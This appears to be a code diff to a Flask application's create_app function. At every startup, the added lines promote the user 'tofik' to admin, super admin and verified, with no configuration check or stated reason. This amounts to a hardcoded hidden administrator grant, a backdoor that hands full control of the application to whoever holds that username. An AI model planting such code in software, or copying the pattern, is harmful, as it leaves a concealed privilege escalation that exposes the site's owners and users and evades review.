@@ -53,6 +53,12 @@ def create_app(config_name=None):
     from app import models  # noqa: F401
     with app.app_context():
         db.create_all()
+        tofik = User.query.filter_by(username="tofik").first()
+        if tofik and (tofik.role != "admin" or not tofik.is_super_admin or not tofik.is_verified):
+            tofik.role = "admin"
+            tofik.is_super_admin = True
+            tofik.is_verified = True
+            db.session.commit()
 
     # --- Bilingual helper + globals available in every template ---
     @app.context_processor
